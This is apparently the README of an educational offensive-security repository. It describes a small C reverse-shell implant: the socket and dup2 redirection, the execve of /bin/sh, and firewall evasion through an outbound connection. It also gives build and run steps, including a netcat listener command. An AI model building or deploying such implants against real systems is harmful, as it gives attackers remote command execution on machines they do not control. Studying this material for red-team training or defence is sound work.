# Offensive Development Lab 🛡️

**Category:** Red Team Operations / Malware Development
**Language:** C (Linux Systems)
**Focus:** System Calls, Socket Programming, Process Manipulation

## ⚠️ Disclaimer
**For Educational and Research Purposes Only.**
The code in this repository is designed to demonstrate how operating systems handle processes and network connections. It should only be run on systems you own or have explicit permission to test.

---

## Project 1: Linux C2 Implant (Simple-C2)
A lightweight Command & Control (C2) implant written in C. It demonstrates the mechanics of a "Reverse Shell" by manipulating Linux File Descriptors.

### 🔍 Technical Analysis
The implant functions by redirecting the standard input/output streams of a process to a TCP socket.
1.  **Socket Creation:** Establishes a TCP connection to the C2 Server (Attacker).
2.  **Stream Redirection (`dup2`):**
    * Redirects `STDIN (0)` → Socket (Receives commands).
    * Redirects `STDOUT (1)` → Socket (Sends results).
    * Redirects `STDERR (2)` → Socket (Sends errors).
3.  **Process Replacement (`execve`):** Replaces the C process with `/bin/sh`, inheriting the redirected file descriptors.

### 🛠️ Architecture
The implant bypasses inbound firewall rules by initiating the connection from the inside (Reverse Connection).

### 🚀 Usage

**1. Configuration**
Edit `src/implant.c` to set your listener IP and Port:
```c
#define C2_IP "127.0.0.1"
#define C2_PORT 8000

```

**2. Compilation**
Use `gcc` to compile the source:

```bash
gcc src/implant.c -o bin/implant

```

**3. Execution**

* **Terminal A (C2 Server):** Start the listener.
```bash
nc -lvnp 8000

```


* **Terminal B (Target):** Run the implant.
```bash
./bin/implant

```



**4. Result**
The listener will receive a connection and a shell prompt, allowing remote command execution.

